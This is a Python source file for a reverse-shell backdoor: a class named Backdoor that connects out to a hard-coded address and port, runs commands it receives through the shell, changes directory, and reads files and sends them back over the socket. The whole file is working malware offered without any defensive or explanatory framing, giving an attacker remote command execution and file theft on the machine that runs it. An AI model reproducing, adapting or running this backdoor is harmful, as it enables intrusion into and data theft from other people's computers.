import socket
import subprocess
import os
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, text=True)

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except FileNotFoundError:
            return "[-] Directory not found: " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def send_file(self, file_content):
        self.connection.sendall(file_content)
        self.connection.sendall(b"DONE")

    def run(self):
        while True:
            command = self.reliable_receive()

            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
                self.reliable_send(command_result)
            elif command[0] == "download":
                file_content = self.read_file(command[1])
                self.send_file(file_content)  #
            else:
                command_result = self.execute_system_command(command)
                self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.0.35", 4444)
my_backdoor.run()
